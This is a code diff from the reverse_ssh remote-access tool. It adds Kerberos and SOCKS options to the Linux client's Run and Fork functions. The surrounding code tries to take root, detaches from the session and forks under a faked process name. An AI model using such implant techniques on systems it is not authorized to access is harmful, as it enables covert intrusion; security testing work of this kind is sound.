@@ -11,21 +11,20 @@ import (
 	"github.com/NHAS/reverse_ssh/internal/client"
 )
 
-func Run(destination, fingerprint, proxyaddress, sni string, _ bool) {
+func Run(destination, fingerprint, proxy, customSNI string, useKerberos bool, socksPort int) {
 	//Try to elavate to root (in case we are a root:root setuid/gid binary)
 	syscall.Setuid(0)
 	syscall.Setgid(0)
 
-	//Create our own process group, and ignore any  hang up signals
+	//Create our own process group, and ignore any hang up signals
 	syscall.Setsid()
 	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE)
 
 	// on the linux platform we cant use winauth
-	client.Run(destination, fingerprint, proxyaddress, sni, false)
+	client.Run(destination, fingerprint, proxy, customSNI, useKerberos, socksPort)
 }
 
-func Fork(destination, fingerprint, proxyaddress, sni string, _ bool, pretendArgv ...string) error {
-
+func Fork(destination, fingerprint, proxy, customSNI string, useKerberos bool, socksPort int, pretendArgv ...string) error {
 	log.Println("Forking")
 
 	err := fork("/proc/self/exe", nil, pretendArgv...)
